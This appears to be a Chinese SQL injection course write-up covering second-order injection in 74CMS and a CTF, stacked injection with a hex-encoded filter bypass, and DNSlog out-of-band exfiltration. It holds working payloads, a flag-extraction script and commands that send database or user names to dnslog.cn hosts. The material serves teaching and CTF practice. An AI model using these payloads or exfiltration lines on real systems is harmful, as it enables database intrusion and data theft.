![1645240350138-53083119-e2ac-4ff7-bb85-0a3284243776.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133042374-555749986.png)

```plain
#知识点：
1、数据库堆叠注入
根据数据库类型决定是否支持多条语句执行
2、数据库二次注入
应用功能逻辑涉及上导致的先写入后组合的注入
3、数据库Dnslog注入
解决不回显(反向连接),SQL注入,命令执行,SSRF等
4、黑盒模式分析以上
二次注入：插入后调用显示操作符合
堆叠注入：判断注入后直接调多条执行
DNS注入：在注入上没太大利用价值，其他还行
```

![1645240804837-98d15a91-12bb-4321-a616-0877443a4ad5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104504-1691516881.png)

- 二次注入-74CMS&网鼎杯2018Unfinish

```plain
攻击分为两步：
找回密码应用功能：
我们登录了一个用户，在用户的界面上有找回密码的功能
找回密码逻辑：
得到你的用户名（你要找回谁）

没有登录用户，我点找回密码，是不是先要输入你要找回的目标
如果登录了用户，一般网站就直接进入验证过程（知道你是谁了）
接收获取你的用户名，修改密码（查询方式：update）

如果我在注册用户名的时候，写的是一个SQL注入的语句。如果修改你的密码，那么相当于username后面加上的是SQL注入代码。
语句：update user set password='xiaodi' where username='xiaosedi';
update user set password='xiaodi' where username=SQL注入代码;
当执行updateSQL语句的时候，就执行了这个漏洞
```

74CMS

```plain
首先从黑盒角度分析这个漏洞的产生原因：
漏洞产生在会员中心简历地方，创建新简历的时候，创建完成后会给你看到简历信息（这就符合插入，查找）
在创建过程中插入payload：xiaodi',address=user()#
```

![1645254274785-3bb4e766-067a-4bc0-a6f9-ca1ed307d93e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133103408-2018987412.png)

```plain
但是提交总是出现错误。重新安装也是一样的。（再次测试，结果就好了。）
```

![1645405265056-cc223bc9-6c6a-4e6a-9bff-c1f49ed0c3bb.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104154-1897768394.png)

```plain
如果正常的话，在查看简历这里是可以观看到user()执行后的结果，就是会显示账号信息（root）
现在来分析产生这种情况的原因。
学校名称：xiaodi',address=user()#
地址：address=user()
然后insert在插入数据的时候，应该是这样：
insert into address value('',user()#')
在刷新数据显示的时候，就把user()这个数据的执行结果显示出来了。
接下来在白盒角度分析这个问题。

创建新简历的URL：
第一步的地址：http://127.0.0.1:8092/user/personal/personal_resume.php?act=make1
第二步创建简历的地址：http://127.0.0.1:8092/user/personal/personal_resume.php?act=make2&pid=2
第四步是payload的插入语句，相对应的地址是：http://127.0.0.1:8092/user/personal/personal_resume.php?act=make4&pid=2
找到相对应的文件（user/personal/personal_resume.php），进行代码分析，找make4相对应的代码：
```

![1645405052977-0fe06316-6f5a-4a45-a793-ba44c70455e5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104867-271564655.png)

```plain
保存触发的URL：http://127.0.0.1:8092/user/personal/personal_resume.php?act=make4_save
抓取分析保存数据包：
POST /user/personal/personal_resume.php?act=make4_save HTTP/1.1
Host: 127.0.0.1:8092
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8092/user/personal/personal_resume.php?act=make4&pid=2
Cookie: UM_distinctid=17e46c24838315-027dd22377488f8-1262694a-144000-17e46c24839418; CNZZDATA3801251=cnzz_eid%3D1994470479-1641863151-%26ntime%3D1645228788; PHPSESSID=f5tif3dik5jv3u6cumfi7s3h45; QS[uid]=1; QS[username]=xiaodi; QS[password]=0e3c4f49d9f3efb5347d2841886f3f9c; QS[utype]=2; QS[pmscount]=1
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 182

start=2027%C4%EA1%D4%C2&endtime=2027%C4%EA1%D4%C2&school=xiaodi%27%2Caddress%3Duser%28%29%23&speciality=vgvjh&education_cn=%D6%D0%D7%A8&education=68&pid=2&disabledsubmit=%B1%A3%B4%E6
从URL进行分析，创建对应的URL为：http://127.0.0.1:8092/user/personal/personal_resume.php?act=make4&pid=2
保存对应的URL为：http://127.0.0.1:8092/user/personal/personal_resume.php?act=make4_save
找到act=make4_save关键代码
```

![1645407031791-5450c35e-0190-4238-ad95-36fd65d32a5e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104948-245047354.png)

```plain
发现关键性代码inserttable自定义函数
```

![1645406910471-b761ed8f-5800-4d9e-a762-c843f01fc7f2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104224-1338836438.png)

```plain
改函数插入的表为resume_education，进一步在数据库中追踪，可以发现插入在学校的数据写在了resume_education表中。
```

![1645407158291-f4bb370a-a900-4082-b6f9-69c3184bbc6f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133103853-1680858563.png)

```plain
先插入学校名称，在写了resume_education表里面。
接下来我们分析查看简历页面：http://127.0.0.1:8092/resume/resume-show.php?id=2
对resume-show.php代码进行分析，分析到调佣模块运行的。
```

![1645407462384-0946898a-40fa-465e-921d-7478ec2175ba.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133105083-1872973985.png)

```plain
这个比较难理解，我们直接跟SQL语句的执行：
访问这个页面，看SQL语句的执行情况
```

![1645407745440-94656426-a4ef-4b9e-a89c-eaa336c29276.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104690-426574070.png)

```plain
访问这个页面，分别找查询了qs_resume，qs_resume_education，qs_resume_work，qs_resume_training 这些表。进行表的查看，发现在表中有root@localhost数据项。
现在分析整个过程，其实可以分为3步：

1.插入：
先插入学校的名称，写入到resume_education

insert into qs_resume.... 
2.执行：
update进行更新，执行address=user()

3.查看：
select取出数据root@localhost
在qs_resumer表的address字段就显示了root@localhost
```

![1645417303379-0b2317f3-d39b-4200-b5a3-9a5b5a3369f5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104276-1588695255.png)

```plain
修改学校执行代码：
保存学校信息的触发地址personal_resume.php?act=save_resume_eduction_edit
寻找save_resume_eduction_edit
```

![1645406205981-51901b4d-c85c-49f4-b65c-3b40a734eeac.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133105043-1282122405.png)

```plain
发现updatetable函数自定义，找到声明地方
```

![1645406332516-50f40671-2735-40ee-a6cb-a318dbc9a48d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104843-1421736128.png)

```plain
修改的时候，调用了update语句，所以修改version不能成功，但是创建可以成功。
```

网鼎杯2018Unfinish

```plain
扫描得到题目注册地方register.php，注册了一个正常的账号密码，登录上去就可以看到一个自己刚刚注册的账号名字（username）
注册：
邮箱：xiaodi@163.com  用户：xiaodi		密码：xiaodi
登录：
邮箱：xiaodi@163.com		密码：xiaodi
登录后显示：xiaodi(用户名)
```

![1645252041573-d14830a7-f0f6-484d-a948-3842fcaf8f83.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133105832-885166934.png)

```plain
这是一个典型的二次注入：
注册用户：添加
邮箱，用户名，密码
insert into user (email,username,password) value('xioadi@163.com','xiaodi','xiaodi')

登录：
邮箱，密码

登录后显示：有个人的用户名
select username from user where email='xiaodi@163.com'
把攻击语句写在username上面，就会形成
select payload（SQL语句） from user where email='xiaodi@163.com'
网上有人自写了一些脚本：
#coding:utf-8
import requests
from bs4 import BeautifulSoup
import time 


url = 'http://735bd6d4-0a6f-4a5d-a508-2af57954e81a.node4.buuoj.cn:81/'

m = ''
for i in range(100):
    payload = "0'+ascii(substr((select * from flag) from {} for 1))+'0".format(i+1)  
    register = {'email':'abc{}@qq.com'.format(i),'username':payload,'password':'123456'}
    login = {'email':'abc{}@qq.com'.format(i),'password':'123456'}
    req = requests.session()
    r1 = req.post(url+'register.php',data = register)
    r2 = req.post(url+'login.php', data = login)
    r3 = req.post(url+'index.php')
    html = r3.text
    soup = BeautifulSoup(html,'html.parser')
    UserName = soup.span.string.strip()
    if int(UserName) == 0:
        break
    m += chr(int(UserName))
    print(m)
    time.sleep(1)

用python310直接运行，下载相对应模块就可以完成flag的获取。
```

![1645253487025-8430fbec-1e17-4fdf-8a7b-2c25af2a730d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104921-1969918044.png)

------

- 堆叠注入-数据库类型&强网杯2019随便注

```plain
根据数据库类型决定是否支持多条语句执行
比如select * from news where id=1;create table xiaodi like news;   执行了两条SQL语句
放在本身执行跟放在代码上执行是不同效果的，要看代码是否支持堆叠注入。如果不支持的话，在代码中堆叠注入不能成功。
支持堆叠数据库类型：MYSQL MSSQL Postgresql等
在数据库中执行select * from users where id=1;create table xiaodi like users;能够成功，但是代码中能不能成功是要看代码是否支持。
```

![1645241893632-afb99480-d72e-4c34-9563-6a8cf6a9d13a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104504-1469302553.png)

```plain
如果在浏览器这样子注入http://127.0.0.1:8081/web/mysql/news.php?id=2;create table xiaosedi like users;
他是不会执行成功的，因为代码上没有堆叠注入的条件。SQL监控也监控到SQL语句，但是没有创建表。
参考：https://www.cnblogs.com/backlion/p/9721687.html
强网杯2019随便注
打开网站地址，输入1
```

![1645244686223-77849e84-c396-4f32-ab09-d7074a0ba6c9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104370-433114908.png)

```plain
可以看出他把1代入数据库执行，输出结果。
尝试执行';show databases;
```

![1645244764097-08fc0d80-fdb2-4ff1-88d0-26b8eb373d3c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104728-2062447868.png)

```plain
可以获取到数据库的库名，然后在继续进行堆叠注入。
获取表名：';show tables;
```

![1645244833696-fbb46758-834d-4576-90b7-f663c22a4e82.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104460-792591059.png)

```plain
发现表名：1919810931114514
继续堆叠注入：';show columns from `1919810931114514`;
```

![1645244930650-5195e41b-6763-420f-a5f3-cd5747190609.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104730-132497278.png)

```plain
得到一个flag字段。
然后想得到flag，执行：';select flag from `1919810931114514`;
```

![1645245003644-2fc5f676-7159-460e-a289-e241599478a9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104704-1079974537.png)

```plain
但是发现了select等过滤，还有大小写都过滤了。这个时候应该怎么处理呢？应该怎么过滤呢？
对';select flag from `1919810931114514`;这个字符串进行转义成16进制。
转化成为：0x73656c656374202a2066726f6d20603139313938313039333131313435313460
构造payload：';SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;
```

![1645245281752-30d179e0-d5e3-4a0a-a3d0-5d15b8330f89.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133104719-816167896.png)

```plain
获得flag。
```

------

- DNS利用-平台介绍&SQL注入&命令执行等

```plain
1.平台
http://www.dnslog.cn
http://admin.dnslog.link
http://ceye.io
2.应用场景：
解决不回显，反向连接，SQL注入，命令执行，SSRF等
在平台上申请一个账号，使用者要支持访问这个地址才能使用，如果不支持那就没办法使用。在注入中只有load_file支持这钟类型的注入。
现在举个命令执行的例子：ping %USERNAME%.ez1dw8.dnslog.cn
SQL注入：
select load_file(concat('\\\\',(select database()),'.7logee.dnslog.cn\\aa'));
and (select load_file(concat('//',(select database()),'.69knl9.dnslog.cn/abc')))
命令执行：
ping %USERNAME%.7logee.dnslog.cn
```

![1645418887712-08ab9e47-21d5-4987-b781-9c19b0ebe1c3.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912133105039-1964082801.png)